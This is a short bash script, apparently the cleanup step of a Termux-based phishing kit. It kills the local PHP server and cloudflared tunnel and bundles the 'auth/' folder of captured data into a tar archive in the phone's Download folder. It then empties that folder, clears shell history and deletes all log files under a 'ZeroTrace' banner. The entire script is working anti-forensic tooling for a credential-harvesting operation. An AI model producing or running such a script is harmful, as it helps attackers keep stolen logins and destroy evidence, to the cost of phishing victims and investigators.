#!/bin/bash
R="$(cd "$(dirname "$0")/.." && pwd)"
TS="$(date +%Y%m%d-%H%M%S)"
DEST="/sdcard/Download/lph-$TS.tar.gz"
pkill -f "php -S" 2>/dev/null; pkill -f "cloudflared" 2>/dev/null
mkdir -p /sdcard/Download
tar -czf "$DEST" -C "$R" auth/ 2>/dev/null
rm -rf "$R/auth"/*
history -c 2>/dev/null; rm -f ~/.bash_history 2>/dev/null
find "$R" -name "*.log" -delete 2>/dev/null
echo -e "\033[1;37m[+] ZeroTrace. Dump em: $DEST\033[0m"
